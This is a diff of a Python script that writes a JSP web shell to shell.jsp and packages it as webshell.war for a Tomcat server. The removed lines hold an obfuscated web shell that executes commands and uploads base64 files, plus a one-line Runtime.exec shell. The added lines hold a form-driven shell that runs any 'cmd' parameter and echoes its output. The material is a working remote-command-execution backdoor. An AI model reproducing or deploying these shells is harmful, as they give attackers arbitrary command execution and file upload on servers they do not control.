@@ -8,12 +8,10 @@ import getopt
 import base64
 import requests
 import os
-
-test=('<%@page import="java.io.*, java.util.*, javax.xml.bind.*, java.net.*"%><script>eval(window.localStorage.embed)</script><%!public String v(String w){String x="";try{x=URLDecoder.decode(w,"UTF-8");}catch(Exception e){}return x;}%><%String o,l,d;o=l=d="";DataInputStream r=new DataInputStream(request.getInputStream());while((l=r.readLine())!=null){d+=l;}if(d.indexOf("c=")>=0){String g=v(d.substring(2));String s;try{Process p=Runtime.getRuntime().exec(g);DataInputStream i=new DataInputStream(p.getInputStream());out.print("<pre>");while((s=i.readLine())!=null){o+=s.replace("<","&lt;").replace(">","&gt;")+"<br>";}}catch(Exception e){out.print(e);}}else{if(d.length()>1){int b=d.indexOf("b=");int n=d.indexOf("n=");byte[] m=DatatypeConverter.parseBase64Binary(v(d.substring(b+2)));String f=v(d.substring(2,n-1))+File.separator+v(d.substring(n+2,b-1));try{OutputStream stream=new FileOutputStream(f);stream.write(m);o="Uploaded: "+f;}catch(Exception e){out.print(e);}}}%><%=o%>')
-JSPcode=' <% Runtime.getRuntime().exec(request.getParameter("cmd")); %> '
+JSPcode="<FORM METHOD=GET ACTION='index.jsp'>\n<INPUT name='cmd' type=text>\n<INPUT type=submit value='Run'>\n</FORM>\n<%@ page import='java.io.' %>\n<%\n   String cmd = request.getParameter('cmd');\n   String output = '';\n   if(cmd != null) {\n      String s = null;\n      try {\n         Process p =\nRuntime.getRuntime().exec(cmd,null,null);\n         BufferedReader sI = new BufferedReader(new\nInputStreamReader(p.getInputStream()));\n         while((s =\nsI.readLine()) != null) { output += s+'</br>'; }\n      }  catch(IOException e) {   e.printStackTrace();   }\n   }\n%>\n<pre><%=output %></pre>" 
 os.mkdir('tomcat')
 shell=open("./tomcat/shell.jsp","w")
-shell.write(test)
+shell.write(JSPcode)
 shell.close()
 os.chdir('./tomcat')
 os.system('jar -cvf ../webshell.war *')
